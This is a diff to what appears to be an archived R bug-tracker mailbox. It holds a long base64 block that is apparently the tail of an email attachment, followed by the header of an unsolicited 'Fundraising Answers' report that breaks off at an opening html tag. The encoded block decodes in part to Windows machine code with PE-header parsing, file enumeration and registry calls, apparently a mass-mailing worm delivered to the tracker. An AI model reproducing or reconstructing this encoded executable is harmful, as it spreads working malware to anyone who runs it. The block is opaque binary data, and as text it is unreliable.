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
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 2035 *
+Subject: Fundraising Answers
+From: NonProfit <fndraiser@hotmail.com>
+Date: Wed, 18 Sep 2002 21:06:01 +0800
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 2035 <==
+From postmaster@franz.stat.wisc.edu  Wed Sep 18 15:06:23 2002
+Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA09353
+	for <r-bugs@biostat.ku.dk>; Wed, 18 Sep 2002 15:06:21 +0200 (MET DST)
+Received: from 200.207.151.143 (really [200.187.174.131]) by franz.stat.wisc.edu
+	via smail with smtp
+	id <m17reWR-000IbeC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
+	for <r-bugs@r-project.org>; Wed, 18 Sep 2002 08:05:39 -0500 (CDT) 
+Message-Id: <m17reWR-000IbeC@franz.stat.wisc.edu>
+From: NonProfit <fndraiser@hotmail.com>
+To: r-bugs@r-project.org
+Cc: 
+Subject: Fundraising Answers
+Sender: NonProfit <fndraiser@hotmail.com>
+Mime-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Date: Wed, 18 Sep 2002 21:06:01 +0800
+X-Mailer: Microsoft Outlook Express 6.00.2462.0000
+Content-Transfer-Encoding: 8bit
+
+<html>
+
